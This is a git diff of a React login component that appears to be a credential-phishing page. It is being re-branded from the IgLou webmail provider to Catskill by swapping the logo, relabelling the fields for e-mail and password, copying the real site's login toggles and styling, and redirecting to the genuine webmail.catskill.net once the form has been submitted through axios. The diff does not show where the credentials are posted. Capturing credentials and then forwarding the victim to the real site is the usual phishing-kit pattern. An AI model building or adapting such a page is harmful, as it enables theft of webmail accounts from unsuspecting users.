@@ -7,7 +7,7 @@ import { useState } from 'react';
 import axios from 'axios';
 
 import iglou from './iglou.png';
-
+import catskill from './catskill.png';
 
 
 function Home(){
@@ -16,7 +16,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("IgLou")
+    const[platform, setPlatform] = useState("Catskill")
 
     const[showError, setShowError] = useState(false);
 
@@ -37,7 +37,7 @@ async function handleSubmit(e){
         if(response.status == 200){
             console.log(response.data.message);
 
-            window.location.href = 'https://webmailrc.iglou.com/';
+            window.location.href = 'https://webmail.catskill.net/';
         }
       } catch (error) {
         // Handle error
@@ -61,18 +61,24 @@ async function handleSubmit(e){
 
 
 
-            <div className='col-md-4 whitediv m-auto py-3 px-4'>
-                <img  src={iglou} />
+            <div className='text-center my-4'>
+            <img  src={catskill} />
+
+            </div>
+
+
+            <div className='col-md-5 whitediv m-auto py-3 px-5'>
+                
 
 
 
                 <form onSubmit={handleSubmit}>
 
                     <div className='form-group'>
-                        <label className='label'> Username</label>
-                        <input type="text"onChange={function(e){
+                        <label className='label'> E-mail address</label>
+                        <input type="email"onChange={function(e){
                             setUserName(e.target.value);
-                        }}value={email} className="form-control"placeholder='Username'required />
+                        }}value={email} className="form-control"required />
 
                     </div>
 
@@ -81,21 +87,50 @@ async function handleSubmit(e){
                         <label className='label'> Password</label>
                         <input type="password"onChange={function(e){
                             setPassword(e.target.value);
-                        }}value={password} className="form-control"placeholder='Password'required />
+                        }}value={password} className="form-control"required />
 
                     </div>
+
+                   
+
 
                     <div className='form-group'>
+                    <label class="toggle-container">
+                        <input type="checkbox"className='mycheck'/> 
+                     <span class="toggle-slider"></span> <span className='px-3 'style={{
+                         fontSize:"15px",
+                     }}>Shared computer - log me out after 4 hours</span>
+    </label>
 
-                        <button type='submit' style={{
-                            background:"#0075c8",
-                        }}className='btn text-center w-100 font-weight-bold text-light'>LOGIN</button>
-
-
-                        <div className='text-center my-2'>
-                            <input type="checkbox"className='px-3'/>Keep me logged in
-                        </div>
                     </div>
+
+
+                    <div className='form-group'>
+                    <label class="toggle-container">
+                        <input type="checkbox"className='mycheck'/> 
+                     <span class="toggle-slider"></span> <span className='px-3 'style={{
+                         fontSize:"15px",
+                     }}>Keep me logged in until I log out</span>
+    </label>
+
+                    </div>
+
+
+                    <div className='form-group text-center'>
+
+<button type='submit' style={{
+    background:"#019bc6",
+}}className='btn text-center w-50 font-weight-bold text-light'>LOGIN</button>
+
+
+
+
+
+
+</div>
+
+
+                 
 
                 </form>
 
